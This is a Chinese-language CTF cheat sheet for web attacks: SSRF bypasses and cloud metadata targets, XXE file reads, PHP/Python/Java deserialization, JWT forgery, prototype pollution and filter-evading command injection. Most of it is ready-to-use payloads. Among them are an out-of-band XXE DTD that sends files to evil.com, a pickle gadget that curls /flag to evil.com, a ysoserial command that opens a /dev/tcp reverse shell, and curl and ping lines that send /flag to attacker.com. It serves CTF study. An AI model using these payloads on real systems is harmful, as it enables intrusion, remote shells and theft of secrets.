# Web CTF 考点速查：SSRF / XXE / 反序列化 / JWT

## 1. SSRF（Server-Side Request Forgery）

服务端发起请求，攻击者可控制目标 URL。常用于：

- 打内网服务（Redis / MySQL / Elasticsearch / HTTP Basic Auth）
- 云平台 Metadata API：`http://169.254.169.254/`（AWS）、`http://metadata.google.internal`
- 文件读取：`file:///etc/passwd`、`php://filter/convert.base64-encode/resource=index.php`
- Gopher 协议：`gopher://127.0.0.1:6379/_...`（打 Redis、打 MySQL、打 FastCGI）

**绕过手法**

```
http://127.0.0.1 → http://2130706433/ (十进制)
http://127.0.0.1 → http://0x7f000001/ (十六进制)
http://0/         # 解析到 0.0.0.0
http://localhost/
http://[::]:22/   # IPv6
http://evil@127.0.0.1/  # userinfo 部分
http://127.0.0.1.xip.io/ → 实际解析为 127.0.0.1
使用 302 跳转：evil.com 返回 302 http://127.0.0.1
DNS rebinding：同一域名短时间内切换到内网 IP
```

**常用 Payload 工具**

- `Gopherus`：构造 Redis/MySQL/FastCGI 的 gopher payload
- `SSRFmap`：自动化探测
- `protocol_dict`：各种协议（dict:// / gopher:// / ftp:// / file://）

## 2. XXE（XML External Entity）

利用 XML 解析器加载外部实体，导致文件读取 / SSRF / 拒绝服务。

```xml
<!-- 文件读取 -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>

<!-- PHP 过滤 > " 等字符时使用 base64 -->
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">

<!-- 盲 XXE / OOB 攻击，利用外部 DTD -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/evil.dtd"> %xxe;]>
<foo></foo>

<!-- evil.dtd -->
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/flag">
<!ENTITY % int "<!ENTITY &#37; send SYSTEM 'http://evil.com/?p=%file;'>">
%int;
%send;
```

**Blind XXE 思路**：无法直接回显时，通过外部 DTD 将文件内容拼到对攻击者服务器的 HTTP 请求中，再通过日志/access log 读出。

## 3. PHP 反序列化

触发场景：`unserialize($user_input)`

**魔术方法**

| 方法 | 触发时机 |
|------|---------|
| `__construct` | 对象创建时 |
| `__destruct` | 对象销毁时 |
| `__wakeup` | unserialize 时 |
| `__toString` | 对象被当作字符串时 |
| `__get` / `__set` | 访问不存在 / 不可访问属性 |
| `__call` / `__callStatic` | 调用不存在 / 不可访问方法 |
| `__invoke` | 对象被当作函数调用 |
| `__isset` / `__unset` | 对不可访问属性 isset / unset |

**POP 链构造**

从「危险终点」（如 `eval()`、`system()`、`file_put_contents()`）反向追溯到魔术方法，再组合成链。

**常见 POP 链工具**：`phpggc`（PHP Generic Gadget Chains）、`php-serialize`

**绕过 CVE**

- CVE-2016-7124 `__wakeup` 绕过：对象属性数大于实际数
- `O:4:"User":2:{...}` → 改为 `O:4:"User":3:{...}`
- 引用 `R:2`、protected/private 属性序列化差异
- 原生类：`SoapClient` → SSRF（CRLF）

## 4. Python 反序列化 / Pickle

```python
import pickle, base64
class RCE:
    def __reduce__(self):
        import os
        return (os.system, ('curl http://evil.com/`cat /flag`',))
payload = pickle.dumps(RCE())
print(base64.b64encode(payload).decode())
```

**常见 sink**：`pickle.loads()`、`yaml.load(..., Loader=Loader)`（PyYAML）、`jsonpickle`、`shelve`、`marshal`

## 5. Java 反序列化

- **Gadget**：CommonsCollections 1-7、CommonsBeanutils、Jdk7u21、ROME、Fastjson、Jackson、Hessian、Dubbo、Shiro
- **工具**：`ysoserial`、`marshalsec`、`ysoserial.net`、`Java-Deserialization-Cheat-Sheet`

**使用示例**

```bash
java -jar ysoserial.jar CommonsCollections5 "bash -c $'bash -i >& /dev/tcp/x.x.x.x/4444 0>&1'" | base64 -w0
```

## 6. JWT 攻击

**JWT 结构**

```
header.payload.signature
header: { "alg": "HS256", "typ": "JWT" }
payload: { "sub": "1", "name": "admin", "iat": ... }
```

**常见攻击**

1. **alg:none**：去掉签名，服务端若接受 `alg=none` 则可伪造
2. **密钥爆破**：HS256 使用弱密钥，可用 `jwt_tool` + 字典爆破
3. **RS256 → HS256**：用公钥当对称密钥，服务端误把公钥当 HS256 密钥校验
4. **kid 参数注入**：`kid` 指向任意文件，可用 `file://` / SQL 注入 / XXE / LFI
5. **JKU / X5U**：攻击者可控的 JWKS URL
6. **敏感信息泄漏**：payload 仅 base64url，并未加密

**工具**

- `jwt_tool`（Python）
- `jwt.io`（在线解码）
- `john`（JWT brute）
- `hashcat -m 16500`（JWT HS256 爆破）

## 7. 原型链污染（Prototype Pollution）

在 JavaScript 中通过 `merge()`、`cloneDeep()` 等递归复制函数污染 `Object.prototype`：

```javascript
let obj = {};
obj.__proto__.polluted = "yes";
console.log({}.polluted); // "yes"
```

**RCE 场景**：Node.js + ejs / jade / handlebars / vm.Script + lodash merge / `merge` 函数。

## 8. 命令执行 & 绕过

```bash
# 空格、分号、管道符被过滤
cat</etc/passwd
cat$IFS/etc/passwd
{cat,/etc/passwd}
X=$'cat\x20/etc/passwd';$X

# 关键字被过滤（用字符串拼接、通配符、反引号、$()）
a=c;b=at;$a$b /etc/passwd
/bin/c?/*sswd
echo "Y2F0IC9ldGMvcGFzc3dk"|base64 -d|bash

# 无回显（盲注）
curl http://attacker.com/$(cat /flag|base64 -w0)
ping -c 1 $(cat /flag).attacker.com
```
